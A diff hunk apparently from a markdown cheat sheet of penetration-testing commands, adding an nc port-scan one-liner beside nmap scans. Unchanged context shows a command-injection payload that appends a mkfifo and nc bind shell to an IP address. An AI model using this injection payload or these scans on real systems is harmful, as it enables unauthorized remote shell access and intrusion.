@@ -47,6 +47,11 @@ nmap -A IP
 192.168.0.18; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc -lp 9999 > /tmp/f
 ```
 
+* TCP scanning with `nc`
+```bash
+nc -nvv -w 1 -z 127.0.0.1 1000-2000
+```
+
 * Scanning all services given a server with `nmap`
 ```bash
 nmap -A 192.168.0.1
